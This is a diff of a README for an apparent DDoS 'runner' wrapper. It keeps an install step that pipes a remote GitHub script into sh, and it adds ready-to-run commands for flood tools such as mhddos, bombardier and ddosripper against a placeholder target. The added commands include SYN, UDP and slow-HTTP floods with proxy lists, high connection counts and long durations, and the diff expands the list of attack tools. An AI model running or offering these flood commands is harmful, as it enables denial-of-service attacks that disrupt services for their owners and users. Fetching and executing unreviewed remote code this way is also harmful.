@@ -18,8 +18,10 @@ curl https://raw.githubusercontent.com/ctukraine22/runner/master/install.sh | sh
 # Run
 
 ```
-/runner/run.sh bombardier x.x.x.x 80 
-/runner/run.sh ddosripper x.x.x.x 443
+/runner/run.sh bombardier -p "i,p,r" -c 1000 -d 9000s -l x.x.x.x 80 
+/runner/run.sh ddosripper x.x.x.x 80 
+/runner/run.sh mhddos SLOW http://x.x.x.x 5 100 socks5.txt 100 9000
+/runner/run.sh mhddos SYN x.x.x.x:80 100 9000
 bash /runner/run.sh mhddos UDP x.x.x.x:53 100 3000
 /runner/run.sh db1000n
 /runner/run.sh uashield
@@ -35,9 +37,12 @@ To use cyberhost you need to provide repo with key and crt file via %vpn-cret-re
 # Supported tools
 - db1000n
 - checksites
-- ddosripper
+- gofucker
 - uashield
+- ddoser
+- ddosripper
 - bombardier
+- mhddos
 - kali
 
 # Get status after reconnect
